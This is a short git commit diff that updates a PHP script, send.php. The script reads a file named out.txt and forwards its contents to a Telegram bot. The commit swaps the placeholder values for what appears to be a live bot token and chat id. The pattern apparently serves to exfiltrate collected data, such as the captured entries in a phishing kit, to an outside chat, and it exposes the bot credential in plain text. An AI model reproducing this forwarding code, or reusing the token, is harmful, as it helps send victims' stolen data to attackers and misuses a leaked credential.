c77ce4b176794345894a7c46a603f76dda5c7bee
parhamsyber <freefiregod32756@gmail.com>
2025-04-21 22:31:51 +0330

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot7540301784:AAHaqrNISOJc2XlV1EgUwP4Vwtiphws5v94/sendMessage?chat_id=7239544191&text=$msg");
 ?>
